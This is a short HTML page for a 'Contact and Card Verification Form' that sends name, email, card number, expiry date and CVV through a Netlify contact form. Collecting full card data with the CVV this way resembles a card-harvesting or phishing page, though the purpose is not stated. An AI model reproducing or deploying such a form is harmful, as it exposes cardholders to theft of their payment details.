<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Contact and Card Verification Form</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h2>Contact and Card Verification Form</h2>
        <form name="contact" netlify id="verificationForm">
            <p>
                <label>Name <input type="text" name="name" required /></label>
            </p>
            <p>
                <label>Email <input type="email" name="email" required /></label>
            </p>
            <p>
                <label>Card Number <input type="text" id="cardNumber" name="cardNumber" required /></label>
            </p>
            <p>
                <label>Expiry Date (MM/YY) <input type="text" id="expiryDate" name="expiryDate" required /></label>
            </p>
            <p>
                <label>CVV <input type="text" id="cvv" name="cvv" required /></label>
            </p>
            <p>
                <button type="submit">Send</button>
            </p>
        </form>
        <div id="message"></div>
    </div>
    <script src="script.js"></script>
</body>
</html>
